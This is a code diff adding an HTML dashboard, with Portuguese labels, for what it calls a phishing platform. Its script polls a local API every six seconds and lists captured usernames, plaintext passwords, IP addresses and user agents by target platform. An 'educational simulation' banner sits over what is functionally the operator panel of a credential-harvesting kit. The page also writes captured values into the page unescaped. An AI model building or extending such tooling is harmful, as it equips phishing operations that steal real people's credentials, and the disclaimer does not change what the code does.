@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Phishing Platform Dashboard</title>
+  <style>
+    body {
+      background: #131313;
+      color: #eee;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 1000px;
+      margin: 38px auto 0 auto;
+      background: #1a1a22;
+      border-radius: 18px;
+      box-shadow: 0 2px 18px #0009;
+      padding: 30px 20px 20px 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #ff3366;
+      margin-bottom: 24px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 14px #470b2a;
+    }
+    .filter-bar {
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+    select, input[type="text"] {
+      padding: 7px 11px;
+      border-radius: 8px;
+      border: 1px solid #444;
+      background: #222;
+      color: #eee;
+      font-size: 15px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 6px;
+    }
+    th, td {
+      padding: 7px 12px;
+      text-align: left;
+      font-size: 15px;
+    }
+    th {
+      background: #242433;
+      color: #fff;
+      letter-spacing: 1px;
+    }
+    tr:nth-child(even) {
+      background: #20202d;
+    }
+    tr:hover {
+      background: #2a2a38;
+    }
+    .warn {
+      color: #ff3366;
+      font-size: 15px;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+    .small {
+      color: #aaa;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>Phishing Platform — Dashboard</h1>
+  <div class="warn">
+    ⚠️ Simulação educacional.<br>
+    Não use para capturar dados reais. Nenhum dado é utilizado fora do ambiente local.
+  </div>
+  <div class="filter-bar">
+    <select id="platformFilter">
+      <option value="">Todas plataformas</option>
+    </select>
+    <input type="text" id="searchUser" placeholder="Buscar usuário/IP..." />
+    <button onclick="loadTable()">Filtrar</button>
+  </div>
+  <table>
+    <thead>
+    <tr>
+      <th>#</th>
+      <th>Plataforma</th>
+      <th>Usuário</th>
+      <th>Senha</th>
+      <th>IP</th>
+      <th>User Agent</th>
+      <th>Data/Hora</th>
+    </tr>
+    </thead>
+    <tbody id="tableBody">
+    <tr>
+      <td colspan="7" style="text-align:center;color:#aaa;">Carregando...</td>
+    </tr>
+    </tbody>
+  </table>
+  <div class="small" style="margin-top:12px;text-align:center;">
+    © Simulador de Phishing | Uso 100% educacional
+  </div>
+</div>
+<script>
+  let allLogs = [];
+  async function loadTable() {
+    const res = await fetch('http://localhost:8080/api/phishing/tentativas');
+    allLogs = await res.json();
+    // Preencher plataformas únicas
+    const platforms = [...new Set(allLogs.map(l => l.plataforma))].sort();
+    const pfSelect = document.getElementById('platformFilter');
+    pfSelect.innerHTML = '<option value="">Todas plataformas</option>' +
+      platforms.map(pf => `<option value="${pf}">${pf}</option>`).join('');
+
+    // Filtros
+    const pfValue = pfSelect.value;
+    const userValue = document.getElementById('searchUser').value.toLowerCase();
+
+    let logs = allLogs;
+    if (pfValue) logs = logs.filter(l => l.plataforma === pfValue);
+    if (userValue)
+      logs = logs.filter(l =>
+        (l.username && l.username.toLowerCase().includes(userValue)) ||
+        (l.ip && l.ip.toLowerCase().includes(userValue))
+      );
+
+    const tbody = document.getElementById('tableBody');
+    if (!logs.length) {
+      tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;color:#999;">Nenhuma tentativa encontrada.</td></tr>`;
+      return;
+    }
+    tbody.innerHTML = logs.map((l, i) => `
+      <tr>
+        <td>${i+1}</td>
+        <td>${l.plataforma}</td>
+        <td>${l.username}</td>
+        <td>${l.password}</td>
+        <td>${l.ip}</td>
+        <td title="${l.userAgent}" style="max-width:160px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${l.userAgent || '-'}</td>
+        <td>${l.dataHora.replace('T', ' ').substring(0, 16)}</td>
+      </tr>
+    `).join('');
+  }
+
+  document.getElementById('platformFilter').onchange = loadTable;
+  document.getElementById('searchUser').oninput = () => {
+    clearTimeout(window.searchTimeout);
+    window.searchTimeout = setTimeout(loadTable, 400);
+  };
+
+  // Atualiza automaticamente a cada 6 segundos
+  setInterval(loadTable, 6000);
+  loadTable();
+</script>
+</body>
+</html>
